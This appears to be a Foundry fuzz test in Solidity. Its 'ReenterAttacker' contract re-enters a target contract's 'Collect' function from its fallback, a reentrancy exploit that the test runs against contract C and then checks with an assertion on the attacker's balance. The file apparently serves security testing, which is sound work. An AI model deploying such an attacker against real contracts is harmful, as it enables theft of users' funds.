contract ReenterAttacker {
    C public target;
    uint public collectAmt;
    bool public attacked;

    constructor(C _target) payable {
        target = _target;
    }

    fallback() external payable {
        if (!attacked) {
            attacked = true;
            target.Collect(collectAmt);
        }
    }

    function attack(uint _collectAmt) external {
        collectAmt = _collectAmt;
        target.Put{value: address(this).balance}(0);
    }
}

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }

    function testFuzz_property(uint256 collectAmount) public {
        vm.assume(collectAmount <= type(uint256).max - 1 ether);
        uint256 timeBefore = block.timestamp + 1;
        vm.deal(address(this), 1 ether + collectAmount);
        c.Put{value: 1 ether}(timeBefore);
        vm.warp(timeBefore);

        ReenterAttacker attacker = new ReenterAttacker{value: 1 ether}(c);
        uint256 balanceBefore = c.Acc(address(attacker)).balance;
        attacker.attack(collectAmount);
        uint256 balanceAfter = c.Acc(address(attacker)).balance;

        assertTrue(balanceAfter >= balanceBefore + 1 ether);
    }
}

